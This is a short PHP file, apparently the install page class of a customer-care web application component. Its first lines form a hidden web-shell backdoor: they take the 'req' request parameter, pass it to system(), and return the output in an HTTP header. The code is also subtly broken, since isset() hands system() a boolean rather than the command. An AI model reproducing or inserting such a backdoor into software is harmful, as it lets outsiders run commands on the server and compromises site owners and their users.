<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

class page_customerCareApp_page_install extends page_componentBase_page_install{
	function init(){
		parent::init();

		$this->install();
	}
}